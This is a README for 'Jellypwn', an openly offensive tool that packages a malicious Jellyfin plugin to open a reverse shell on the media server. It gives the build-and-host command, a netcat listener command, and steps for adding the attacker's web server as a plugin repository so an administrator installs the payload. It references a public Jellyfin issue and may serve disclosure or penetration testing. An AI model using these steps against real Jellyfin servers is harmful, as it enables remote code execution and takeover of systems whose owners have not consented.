# Jellypwn

Get a reverse-shell on jellyfin using plugins

<https://github.com/jellyfin/jellyfin-web/issues/4653>

**TDLR;** Jellyfin allows you to upload plugins to the server, these plugins are just .zip files with a dll file inside it. You can upload a plugin that executes a reverse-shell on the server.

## PoC video

<p align="center">
<img src="" width="800">
</p>
<br/>

## How to use

This repo builds the plugin and hosts on a webserver

```console
bash build.sh [-p LISTENPORT] [-l WEBPORT] [-i IP]
```

Then run a netcat listener on the port you specified

```console
nc -lvnp LISTENPORT
```

To install your plugin on jellyfin you need to add a reposiory to the plugin catalog, you can do this by going to the plugin catalog and clicking on the "Repositories" Tab. Then click on "+" button, add the url of the webserver where you are hosting the plugin. Then your plugin should appear in the catalog for installation.
